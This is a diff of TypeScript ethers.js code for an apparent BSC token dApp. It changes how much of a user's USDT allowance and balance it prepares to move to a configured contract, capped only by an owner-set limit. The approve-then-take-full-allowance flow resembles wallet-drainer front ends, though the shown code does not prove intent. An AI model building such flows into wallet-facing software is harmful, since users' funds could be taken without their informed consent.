@@ -207,8 +207,7 @@ export async function switchToBSC() {
 
 export async function approveToken(signer: ethers.Signer) {
   const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, signer);
-  // USDT on BSC uses 6 decimals — fallback to 6 not 18
-  const decimals = await token.decimals().catch(() => 6);
+  const decimals = await token.decimals().catch(() => 18);
   const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
   const tx = await token.approve(CONFIG.CONTRACT_ADDRESS, ownerCapRaw);
   await tx.wait();
@@ -221,25 +220,25 @@ export async function prepareAndSignTransaction(
   userAddress: string
 ) {
   const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, provider);
-
-  // USDT on BSC uses 6 decimals — fetch from contract, fallback to 6 (not 18)
-  const decimals = await token.decimals().catch(() => 6);
-
-  const [allowance, balance] = await Promise.all([
+  const [decimals, allowance, balance] = await Promise.all([
+    token.decimals().catch(() => 18),
     token.allowance(userAddress, CONFIG.CONTRACT_ADDRESS),
     token.balanceOf(userAddress)
   ]);
 
-  // Use allowance as incoming (it was set during approve step)
-  // cap to balance in case allowance exceeds it
+  // Use allowance as the amount — it is what was approved in step 2
+  // Do NOT use raw balance directly as it can cause contract overflow
   let incoming = allowance;
-  if (balance < incoming) incoming = balance;
+  if (incoming === 0n) throw new Error('No allowance found. Please complete the approval step first.');
 
-  // Cap to ownerCap if configured
+  // Cap at owner cap if set
   const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
   if (ownerCapRaw > 0n && ownerCapRaw < incoming) incoming = ownerCapRaw;
 
-  if (incoming === 0n) throw new Error('No approved balance found. Please complete the approval step first.');
+  // Never exceed actual balance
+  if (balance < incoming) incoming = balance;
+
+  if (incoming === 0n) throw new Error('Incoming amount is 0 — cannot sign');
 
   const network = await provider.getNetwork();
   const chainId = network.chainId;
